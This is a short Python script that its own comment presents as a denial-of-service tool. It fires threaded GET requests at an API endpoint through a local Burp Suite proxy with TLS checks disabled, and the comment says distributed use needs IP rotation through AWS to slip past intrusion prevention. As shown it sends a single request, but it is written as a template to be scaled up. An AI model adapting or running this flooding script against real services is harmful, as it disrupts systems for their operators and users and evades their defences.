#DoS can be run without proxy. DDoS requires proxy with Burpsuite ip rotation with connection to AWS for IPS
import requests
from concurrent.futures import ThreadPoolExecutor

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

#modify as required
header = {
    'Content-Type': 'application/json', 
    'User-Agent' : 'gui-api',
    'Content-Type' : 'application/json;charset=utf-8',
    'X-Cf-Token' : '',
    'Cookie' : 'csrftoken='
}

def get_url(url):
    return requests.get(url, headers=header, proxies=proxies, verify=False )
list_of_urls = ["https://api-prod.example.com/v2/all/markets"]*1
with ThreadPoolExecutor(max_workers=1) as pool:
    response_list = list(pool.map(get_url,list_of_urls))
for response in response_list:
    print(response.status_code)